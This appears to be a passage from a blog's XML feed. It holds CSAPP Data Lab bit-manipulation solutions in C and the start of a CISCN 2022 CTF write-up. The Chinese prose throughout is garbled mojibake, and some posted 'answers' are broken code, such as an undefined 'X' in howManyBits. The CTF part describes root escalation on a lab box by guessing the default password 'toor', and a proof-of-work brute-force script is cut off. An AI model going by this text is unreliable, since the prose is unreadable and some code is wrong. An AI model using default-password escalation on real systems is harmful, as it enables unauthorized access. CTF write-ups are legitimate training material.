æ˜¯é™¤äº† <code>TMIN</code> ä»¥å¤–çš„è´Ÿæ•°å€¼ç­‰äºè‡ªå·±æœ¬èº«çš„æ•°äº†ã€‚ç„¶åå†åˆ¤æ–­ä¸€ä¸‹æœ€é«˜ä½å³å¯ã€‚</p><h4 id="ç­”æ¡ˆ-6"><a href="#ç­”æ¡ˆ-6" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æŒºéš¾çš„ï¼Œé¦–å…ˆè¦æƒ³åˆ°ä¸€ä¸ªäºŒåˆ†ï¼Œç„¶åè¦æ³¨æ„æ­£æ•°éœ€è¦å¤šä¸€ä½ï¼Œè´Ÿæ•°ä¸éœ€è¦ã€‚å‡å¦‚æˆ‘ç»™äº†ä½  <code>0x7fffffff</code>ï¼Œé‚£ä¹ˆä½ è‚¯å®šè¦ <code>32</code> ä½ï¼Œè™½ç„¶æˆ‘åªæœ‰ <code>31</code> ä½æœ‰æ•ˆæ•°å­—ã€‚æˆ‘ç»™ä½ ä¸ª <code>-1</code> é‚£ä¸€ä½å°±å¤Ÿäº†ï¼Œå› ä¸ºä¸€ä½çš„èŒƒå›´å°±æ˜¯ <code>-1~0</code>ã€‚</p><p>æˆ‘ä»¬å…ˆåˆ¤æ–­é«˜ <code>16</code> ä½æ˜¯å¦æœ‰ <code>1</code>ï¼Œè‹¥æœ‰åˆ™åˆ¤æ–­é«˜ <code>16</code> ä½ï¼Œç­”æ¡ˆåŠ ä¸Š <code>16</code>ï¼Œå¦åˆ™åˆ¤æ–­ä½ <code>16</code> ä½ã€‚</p><p>å†åˆ¤æ–­çš„ <code>16</code> ä½ä¸­ï¼Œåˆ¤æ–­é«˜ <code>8</code> ä½æ˜¯å¦æœ‰ <code>1</code>ï¼Œè‹¥æœ‰åˆ™ç»§ç»­åˆ¤æ–­é«˜ <code>8</code> ä½ï¼Œç­”æ¡ˆåŠ ä¸Š<code>8</code>ï¼Œå¦åˆ™åˆ¤æ–­ä½ <code>8</code> ä½ã€‚</p><p>ç›´åˆ°åˆ¤å®Œã€‚æˆ‘ä¸€å¼€å§‹æƒ³åˆ°äº†è¿™ä¸ªï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sign=!(&gt;&gt;<span class="number">31</span>); </span><br><span class="line"><span class="keyword">int</span> b16=(!!((x&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x=x&gt;&gt;b16;</span><br><span class="line">x=x&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> b8=(!!((x&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">x=x&gt;&gt;b8;</span><br><span class="line"><span class="keyword">int</span> b4=(!!((x&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x=x&gt;&gt;b4;</span><br><span class="line"><span class="keyword">int</span> b2=(!!((x&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">x=x&gt;&gt;b2;</span><br><span class="line"><span class="keyword">int</span> b1=(!!((x&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>))&lt;&lt;<span class="number">0</span>;</span><br><span class="line">x=x&gt;&gt;b1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d %d %d %d\n&quot;</span>,b16,b8,b4,b2,b1,x,sign);</span><br><span class="line"><span class="keyword">return</span> b16+b8+b4+b2+b1+sign+x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç»è¿‡å¤šæ–¹è°ƒè¯•è¿˜æ˜¯è¾“ç»™äº† <code>-1</code> è¿™ä¸ªæµ‹è¯•ç‚¹ã€‚åæ¥æƒ³åˆ°å¦‚æœè´Ÿæ•°åˆ™å–åå³å¯ï¼Œç„¶åç¬¦å·ä½å°±é»˜è®¤ç»™å®ƒåŠ ç€ä¸Šå»å³å¯ã€‚</p><h4 id="ç­”æ¡ˆ-7"><a href="#ç­”æ¡ˆ-7" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line"><span class="keyword">int</span> b16=(!!((x&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x=x&gt;&gt;b16;</span><br><span class="line">x=x&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> b8=(!!((x&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">x=x&gt;&gt;b8;</span><br><span class="line"><span class="keyword">int</span> b4=(!!((x&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x=x&gt;&gt;b4;</span><br><span class="line"><span class="keyword">int</span> b2=(!!((x&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">x=x&gt;&gt;b2;</span><br><span class="line"><span class="keyword">int</span> b1=(!!((x&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>))&lt;&lt;<span class="number">0</span>;</span><br><span class="line">x=x&gt;&gt;b1;</span><br><span class="line"><span class="keyword">return</span> b16+b8+b4+b2+b1+X+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´æ•°é˜¶æ®µåˆ°æ­¤å®Œç»“äº†å°±ã€‚</p><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ä¹˜ <code>2</code>ã€‚é¦–å…ˆæ’é™¤æ‰é‚£äº›ç‰¹æ®Šå€¼ï¼š <code>NANï¼ŒINF</code> å’Œ <code>0</code>ï¼Œä¹˜äºŒè¿”å›æŒ‡æ•° <code>+1</code> å³å¯ï¼Œ</p><h4 id="ç­”æ¡ˆ-8"><a href="#ç­”æ¡ˆ-8" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span> = (uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>;</span><br><span class="line"><span class="keyword">int</span> sign = uf&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">0</span>) <span class="keyword">return</span> uf&lt;&lt;<span class="number">1</span>|sign;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> uf;</span><br><span class="line"><span class="built_in">exp</span>++;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>|sign;</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>)|(uf&amp;<span class="number">0x807fffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°ä¸€ä¸ªç±»ä¼¼æ˜¯å¼ºåˆ¶è½¬æ¢çš„ä¸œè¥¿å§ï¼Œé¦–å…ˆè¿˜æ˜¯æŒ‰ç…§æµ®ç‚¹æ•°çš„è§„åˆ™æŠŠå„ä¸ªå­—æ®µæå–å‡ºæ¥ï¼Œç„¶åç‰¹åˆ¤ç§»ä½å°±è¡Œäº†ã€‚</p><h4 id="ç­”æ¡ˆ-9"><a href="#ç­”æ¡ˆ-9" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> s=uf&gt;&gt;<span class="number">31</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span>=((uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>)<span class="number">-127</span>;</span><br><span class="line"><span class="keyword">int</span> frac=(uf&amp;<span class="number">0x007fffff</span>)|<span class="number">0x00800000</span>;</span><br><span class="line"><span class="keyword">if</span>(!(uf&amp;<span class="number">0x7fffffff</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">31</span>)<span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">23</span>)frac&lt;&lt;=(<span class="built_in">exp</span><span class="number">-23</span>);</span><br><span class="line"><span class="keyword">else</span> frac&gt;&gt;=(<span class="number">23</span>-<span class="built_in">exp</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!((frac&gt;&gt;<span class="number">31</span>)^s)) <span class="keyword">return</span> frac;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(frac&gt;&gt;<span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> ~frac+<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°è¿ç®— <code>pow(2,x)</code>ï¼Œè¿”å›ç»“æœä¸º <code>int</code> è™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥ <code>1&lt;&lt;x</code>ï¼Œä½†æ˜¯å®ƒè¦æ±‚æµ®ç‚¹è®¡ç®—ã€‚</p><p>é¦–å…ˆé˜²æ­¢æº¢å‡ºå…ˆåˆ¤æ–­ï¼Œå› ä¸ºæ˜¯ <code>2</code> çš„æ•´æ•°æ¬¡æ–¹ï¼Œæ‰€ä»¥å®ƒçš„ç»“æœå°±æ˜¯ <code>(exp+127)&lt;&lt;23</code>ï¼Œç„¶ååˆ¤æ–­æ— ç©·å°å’Œæº¢å‡ºå³å¯ï¼Œè¿™ä¸ªæ¯”è¾ƒç®€å•ã€‚</p><h4 id="ç­”æ¡ˆ-10"><a href="#ç­”æ¡ˆ-10" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> INF = <span class="number">0xff</span>&lt;&lt;<span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &gt;= <span class="number">255</span>) <span class="keyword">return</span> INF;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ï¼Œç”±äºæœ€åä¸€ä¸ªé¢˜ç›®æµ‹è¯•æ•°æ®æ¯”è¾ƒå¤šï¼Œå› æ­¤è¦ä¿®æ”¹æ—¶é™æ‰èƒ½é€šè¿‡ã€‚æˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘ç®—æ³•æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œè¿™ <code>O(1)</code> çš„å¤æ‚åº¦ä¹Ÿä¸çŸ¥é“ä¸Šå“ªä¼˜åŒ–å»ã€‚</p><h3 id="result"><a href="#result" class="headerlink" title="result"></a>result</h3><p><img src="/2022/06/03/CSAPP_Datalab/6.png" alt="6"></p><h2 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å•¥ä¹Ÿä¸è¯´äº† <code>CSAPP</code> æ°¸è¿œçš„ç¥ï¼Œå…¥é—¨äºŒè¿›åˆ¶å¿…å¤‡ä¹¦ç±ï¼ŒäºŒåˆ·éƒ½èƒ½æ„Ÿè§‰å­¦åˆ°äº†å¾ˆå¤šä»¥å‰æ²¡å­¦åˆ°çš„ä¸œè¥¿ï¼Œæ¥ä¸‹æ¥æ²¡ä»¥å‰è®¤çœŸçœ‹çš„ä¹Ÿéƒ½å¾—å»çœ‹ä¸€éäº†ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¹‹å‰ &lt;code&gt;CS:APP&lt;/code&gt; æ²¡æœ‰å¥½å¥½å­¦ï¼Œä»Šå¤©ä¸‹å®šå†³å¿ƒæ¥é‡æ–°çœ‹ä¸€éï¼Œå¹¶æŠŠå®éªŒå¥½å¥½åšä¸€éä»¥å·©å›ºè‡ªèº«ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="csapp" scheme="http://example.com/categories/csapp/"/>
    
    <category term="ä¿¡æ¯çš„è¡¨ç¤ºå¤„ç†" scheme="http://example.com/categories/csapp/%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%A4%84%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN2022 åˆèµ›WP</title>
    <link href="http://example.com/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/"/>
    <id>http://example.com/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/</id>
    <published>2022-05-31T16:00:00.000Z</published>
    <updated>2022-06-01T15:05:44.604Z</updated>
    
    <content type="html"><![CDATA[<p>å’•äº†æœ‰ç‚¹ä¹…äº†ï¼Œæ¥å‘ä¸€ä¸‹</p><span id="more"></span><h1 id="CISCN2022åˆèµ›WP"><a href="#CISCN2022åˆèµ›WP" class="headerlink" title="CISCN2022åˆèµ›WP"></a>CISCN2022åˆèµ›WP</h1><h2 id="ä¸€ã€-æˆ˜é˜Ÿä¿¡æ¯"><a href="#ä¸€ã€-æˆ˜é˜Ÿä¿¡æ¯" class="headerlink" title="ä¸€ã€ æˆ˜é˜Ÿä¿¡æ¯"></a>ä¸€ã€ æˆ˜é˜Ÿä¿¡æ¯</h2><p><strong>æˆ˜é˜Ÿåç§°ï¼šflagè™½ä¸èƒ½è‡³ï¼Œç„¶å¿ƒå‘å¾€ä¹‹</strong></p><p><strong>æˆ˜é˜Ÿæ’åï¼šç¬¬130å</strong></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204836288.png" alt="image-20220529204836288"></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204847304.png" alt="image-20220529204847304"></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204852556.png" alt="image-20220529204852556"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ç­¾åˆ°ç”µå°"><a href="#ç­¾åˆ°ç”µå°" class="headerlink" title="ç­¾åˆ°ç”µå°"></a>ç­¾åˆ°ç”µå°</h3><p>æ ¹æ®é¢˜ç›®çš„æç¤ºä»å…¬ä¼—å·è·å–ä¸¤ä¸ªhintï¼š</p><ol><li><p>åœ¨â€œæ ‡å‡†ç”µç è¡¨â€æ‰¾â€œå¼¼æ—¶å®‰å…¨åˆ°è¾¾äº†â€æ‰€å¯¹åº”çš„7ä¸ªç”µç ï¼Œå†è·Ÿâ€œå¯†ç æœ¬â€çš„å‰7*4ä¸ªæ•°å­—åˆ†åˆ«é€ä½è¿›è¡Œâ€œæ¨¡åç®—æ³•â€ï¼ˆåŠ ä¸è¿›ä½ã€å‡ä¸å€Ÿä½ï¼‰ï¼Œæ‰€å¾—åˆ°çš„å°±æ˜¯è¦å‘é€çš„ç”µç ã€‚å‘é€ç”µç å‰å…ˆå‘é€â€œsâ€å¯åŠ¨ï¼Œå³æŒ‰3ä¸ªâ€œ.â€ï¼Œè¿™ä¸ªå‘é€ç”µæŠ¥çš„è¿‡ç¨‹å¯ä»¥ä½¿ç”¨æŠ“åŒ…è½¯ä»¶è¿›è¡ŒæŠ“å–ï¼Œå¯æ–¹ä¾¿è¾“å…¥ç”µæŠ¥ã€‚</p></li><li><p>â€œå¼¼æ—¶å®‰å…¨åˆ°è¾¾äº†â€æ‰€å¯¹åº”çš„7ä¸ªç”µç ï¼š1732 2514 1344 0356 0451 6671 0055ã€‚æ¨¡åç®—æ³•ç¤ºä¾‹ï¼š1732ä¸6378å¾—åˆ°7000ï¼Œå‘åŒ…ç¤ºä¾‹ï¼š/send?msg=s</p></li></ol><p>ç„¶åè®¿é—®/secretçœ‹åˆ°å¯†ç ï¼Œå–å‰28ä¸ªåšæ¨¡10è¿ç®—ï¼Œå†ç”¨hint2çš„å‘åŒ…æ–¹å¼å‘é€å¾—åˆ°flagã€‚</p><h3 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯"><a href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯" class="headerlink" title="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯"></a>åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯</h3><p>è¿™é¢˜ç»™äº† <code>ssh</code>ï¼Œæœ‰æƒé™å°±æƒ³ç€å…ˆè¿ä¸€ä¸‹ï¼Œè¿ä¸Šå»ä¹‹åè¯•è¯• <code>find / | grep &quot;flag.txt&quot; </code>æ‰¾åˆ°ä¸€ä¸ªç±»ä¼¼ <code>flag</code>çš„ä¸œè¥¿ï¼Œä½†æ˜¯ä¸æ˜¯ <code>flag</code>ï¼Œæ­¤æ—¶åˆçœ‹åˆ°ä¸¤ä¸ªé¢˜ç›®æ˜¯è¿ç€çš„ï¼Œæ‰€ä»¥å°±çŒœæµ‹åº”è¯¥æ˜¯ <code>flag1.txt</code> å’Œ <code>flag2.txt</code>ã€‚å¯»æ‰¾ä¹‹åå‘ç° <code>/root/cube-shell/instance/flag_server/</code> ç›®å½•ä¸‹å­˜åœ¨ï¼Œç„¶åå°±ç›´æ¥æ‹¿åˆ°ä¸¤ä¸ªé¢˜ç›®çš„ <code>flag</code> äº†ã€‚</p><h3 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3"><a href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3" class="headerlink" title="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3"></a>åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3</h3><p>æœ‰äº†å‰ä¸¤é“é¢˜ç›®çš„é“ºå«ä¹‹åï¼Œåˆè¯•äº†è¯•æŸ¥çœ‹è¯¥ç›®å½•ä¸‹çš„ <code>flag</code> å‘ç°æƒé™ä¸å¤Ÿï¼Œç„¶åå°±å°è¯•ææƒï¼Œç›´æ¥è¯•è¯•çœ‹é»˜è®¤å¯†ç ï¼Œéšä¾¿è¾“äº†å‡ ä¸ªè¯•åˆ°äº† <code>toor</code> ç›´æ¥å°±ææƒäº†ï¼Œç„¶åæ‹¿ä¸‹flagã€‚</p><h3 id="ISO9798"><a href="#ISO9798" class="headerlink" title="ISO9798"></a>ISO9798</h3><p>é“¾æ¥é¶æœºï¼Œæœ‰powï¼Œçˆ†ç ´å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">hash</span>=<span class="string">&#x27;ed8e248b4ec6828ea8f2cda56293484cbff40d934aba1e641cc3fcbf94e1757c&#x27;</span></span><br><span class="line">sss=<span class="string">&#x27;Eee9sVQumMWXoLEL&#x27;</span></span><br><span class="line">table=<span 